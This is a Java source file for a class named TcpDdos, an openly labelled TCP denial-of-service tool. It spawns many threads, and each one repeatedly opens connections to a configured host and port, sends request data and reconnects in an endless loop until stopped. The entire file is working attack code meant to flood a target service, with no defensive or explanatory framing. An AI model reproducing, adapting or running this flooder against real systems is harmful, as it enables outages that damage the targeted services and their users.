package ljs.ddos.tcp;

import ljs.ddos.SocketRequestBuild;
import ljs.io.IOUtil;

import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class TcpDdos {
    private int threadNumber;
    private SocketRequestBuild socketRequestBuild;

    public TcpDdos(SocketRequestBuild socketRequestBuild, int threadNumber) {
        this.threadNumber = threadNumber;
        this.socketRequestBuild = socketRequestBuild;
    }

    private int liveThread;
    private boolean stop;

    private class AttachRunnable implements Runnable {
        @Override
        public void run() {
            synchronized (this) {
                liveThread++;
            }
            Socket socket = null;
            while (true) {
                if (stop) break;
                InputStream in = null;
                OutputStream out = null;
                try {
                    socket = new Socket(socketRequestBuild.getHost(), socketRequestBuild.getPort());
                    IOUtil.write(socketRequestBuild.getData(), out = socket.getOutputStream(), false);
                    in = socket.getInputStream();
                    byte[] buffer = new byte[2048];
                    int read = 0;
                    while ((read = in.read(buffer)) != -1) ;
                } catch (IOException e) {
                } finally {
                    IOUtil.close(out);
                    IOUtil.close(in);
                    IOUtil.close(socket);
                }
            }
            synchronized (this) {
                liveThread--;
            }
        }
    }

    public TcpDdos attack() {
        if (stop) stop = false;
        for (int i = 0; i < threadNumber; i++) new Thread(new AttachRunnable(), "DDos_Thread_" + i).start();
        return this;
    }

    public int getLiveThread() {
        return liveThread;
    }

    public void stop() {
        this.stop = true;
    }
}
